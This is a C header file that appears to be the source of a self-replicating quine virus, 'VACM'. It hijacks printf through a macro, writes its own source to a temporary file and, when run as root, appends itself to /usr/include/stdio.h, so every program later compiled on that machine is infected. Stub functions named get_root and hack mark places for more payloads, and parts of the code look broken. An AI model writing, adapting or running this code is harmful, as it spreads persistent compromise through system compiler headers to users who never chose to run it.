#ifndef __VACM__
#define __VACM__
#include<stdio.h>
#include<string.h>
#include<stdlib.h>
//quine_start
void get_system_output(char *cmd,char *output){
    char *s=malloc(strlen(cmd)+64);
    strcpy(s,cmd);
    strcat(s," > _gmout.out");
    system(s);
    FILE *file = fopen("_gmout.out","r");
    fscanf(file,"%s",output);
    fclose(file);
    free(s);
    system("rm _gmout.out");
}
void get_root(){

}

void infect_gcc(){
    static char output[2048];
    memset(output,0,sizeof output);
    get_system_output("whoami",output);
    if(strcmp(output,"root")){
        puts("gg");
    }else{
        puts("I am root!");
        
        system("cat tmp >> /usr/include/stdio.h");
        system("echo \"#\"endif >> /usr/include/stdio.h");
        system("rm tmp");
    }
}

void hack(){
    
}
int VACM();
int _VACM(){ //quine_replace
    static int flag=0;
    if(flag)return 0;
    flag=1;
    static char output[2048];
    memset(output,0,sizeof output);
    get_system_output("grep VACM /usr/include/stdio.h",output);
    if(strcmp(output,"")!=0){
        puts("nixixi");
        return 0;
    }
    get_root();
    infect_gcc();
    hack();
    return 0;
}

void function1(){}
void function2(){_VACM();}

int printf2(const char *format){
    va_list ap;
    VACM();
    return printf(format,ap);
}

#define printf printf2



int VACM()
{
function1();FILE *file=fopen("tmp","w");
char *s="#ifndef __VACM__%c#define __VACM__%c%c#include<string.h>%c#include<stdlib.h>%c//quine_start%cvoid get_system_output(char *cmd,char *output){%c    char *s=malloc(strlen(cmd)+64);%c    strcpy(s,cmd);%c    strcat(s,%c > _gmout.out%c);%c    system(s);%c    FILE *file = fopen(%c_gmout.out%c,%cr%c);%c    fscanf(file,%c%cs%c,output);%c    fclose(file);%c    free(s);%c    system(%crm _gmout.out%c);%c}%cvoid get_root(){%c%c}%c%cvoid infect_gcc(){%c    static char output[2048];%c    memset(output,0,sizeof output);%c    get_system_output(%cwhoami%c,output);%c    if(strcmp(output,%croot%c)){%c        puts(%cgg%c);%c    }else{%c        puts(%cI am root!%c);%c        %c        system(%ccat tmp >> /usr/include/stdio.h%c);%c        system(%cecho #endif >> /usr/include/stdio.h%c);%c        system(%crm tmp%c);%c    }%c}%c%cvoid hack(){%c    %c}%cint VACM();%cint _VACM(){ //quine_replace%c    static int flag=0;%c    if(flag)return 0;%c    flag=1;%c    static char output[2048];%c    memset(output,0,sizeof output);%c    get_system_output(%cgrep VACM /usr/include/stdio.h%c,output);%c    if(strcmp(output,%c%c)!=0){%c        puts(%cnixixi%c);%c        return 0;%c    }%c    get_root();%c    infect_gcc();%c    hack();%c    return 0;%c}%c%cvoid function1(){}%cvoid function2(){_VACM();}%c%cint printf2(const char *format){%c    va_list ap;%c    VACM();%c    return printf(format,ap);%c}%c%c#define printf printf2%c%c%c%cint VACM()%c{%cfunction1();FILE *file=fopen(%ctmp%c,%cw%c);%cchar *s=%c%s%c;%cfprintf(file,s,10,10,10,10,10,10,10,10,10,34,34,10,10,34,34,34,34,10,34,37,34,10,10,10,34,34,10,10,10,10,10,10,10,10,10,34,34,10,34,34,10,34,34,10,10,34,34,10,10,34,34,10,34,34,10,34,34,10,10,10,10,10,10,10,10,10,10,10,10,10,10,34,34,10,34,34,10,34,34,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,34,34,34,34,10,34,s,34,10,10,10);fclose(file);function2();%c}%c";
fprintf(file,s,10,10,10,10,10,10,10,10,10,34,34,10,10,34,34,34,34,10,34,37,34,10,10,10,34,34,10,10,10,10,10,10,10,10,10,34,34,10,34,34,10,34,34,10,10,34,34,10,10,34,34,10,34,34,10,34,34,10,10,10,10,10,10,10,10,10,10,10,10,10,10,34,34,10,34,34,10,34,34,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,34,34,34,34,10,34,s,34,10,10,10);fclose(file);function2();
}
int main(){
    printf("__VACM__");
}
#endif
